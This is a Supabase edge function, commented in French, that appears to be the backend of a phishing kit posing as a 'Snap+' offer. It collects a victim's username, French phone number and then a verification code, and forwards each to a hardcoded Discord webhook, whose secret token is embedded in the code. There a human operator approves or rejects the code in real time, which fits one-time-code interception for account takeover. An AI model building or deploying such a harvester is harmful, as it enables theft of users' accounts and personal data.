import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1467109225367867412/01lomqYSMEROKtSs82fkkA-9LY7ZN0QwUXZ0PIlIeCsU3cmO9oZ17QOF0_QfKyFjSeOv";

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const { username, phone, code, step, submissionId } = await req.json();

    // Si c'est le formulaire initial, créer une entrée
    if (step === "form") {
      const { data, error } = await supabase
        .from('submissions')
        .insert({ username, phone, status: 'pending' })
        .select()
        .single();

      if (error) throw error;

      const embed = {
        title: "📱 Nouveau formulaire Snap+",
        description: `🆕 **Nouvelle soumission**\n\n👤 **Nom d'utilisateur:** ${username}\n📞 **Téléphone:** +33${phone}`,
        color: 0xFFD700,
        timestamp: new Date().toISOString(),
        footer: { text: `ID: ${data.id}` }
      };

      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] }),
      });

      return new Response(JSON.stringify({ success: true, submissionId: data.id }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Si c'est le code, mettre à jour et envoyer pour validation avec boutons
    if (step === "code" && submissionId) {
      await supabase
        .from('submissions')
        .update({ code, status: 'pending' })
        .eq('id', submissionId);

      const callbackUrl = `${supabaseUrl}/functions/v1/submission-callback`;
      const now = new Date();
      const dateStr = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric' });
      const timeStr = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

      const embed = {
        title: "🔐 Code de vérification soumis",
        color: 0xFFD700,
        fields: [
          { name: "👤 Nom d'utilisateur", value: username, inline: false },
          { name: "🔢 Code saisi", value: `\`${code}\``, inline: true },
          { name: "📞 Téléphone", value: `+33${phone.replace(/(\d{2})(?=\d)/g, '$1 ')}`, inline: false },
          { name: "📅 Soumis à", value: `${dateStr} ${timeStr}`, inline: false },
        ],
        footer: { text: "En attente de validation par un modérateur" },
      };

      // Message avec boutons URL
      const payload = {
        embeds: [embed],
        components: [
          {
            type: 1, // Action Row
            components: [
              {
                type: 2, // Button
                style: 5, // Link style
                label: "Accepter",
                url: `${callbackUrl}?id=${submissionId}&action=approve`,
                emoji: { name: "✅" }
              },
              {
                type: 2, // Button
                style: 5, // Link style
                label: "Refuser",
                url: `${callbackUrl}?id=${submissionId}&action=reject`,
                emoji: { name: "❌" }
              }
            ]
          }
        ]
      };

      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: unknown) {
    console.error('Error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: errorMessage }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
